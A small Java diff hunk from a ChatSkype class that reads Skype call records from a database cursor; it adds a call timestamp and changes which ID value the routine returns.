@@ -402,10 +402,11 @@ public class ChatSkype extends SubModuleChat {
 				callInfo.peer = cursor.getString(1);
 				callInfo.displayName = cursor.getString(2);
 				int type = cursor.getInt(4);
+				callInfo.timestamp = new Date(cursor.getLong(5));
 				callInfo.incoming = cursor.getInt(6) == 1;
 				callInfo.valid = true;
 				
-				return cursor.getLong(0);
+				return callInfo.id;
 			}
 		};
 
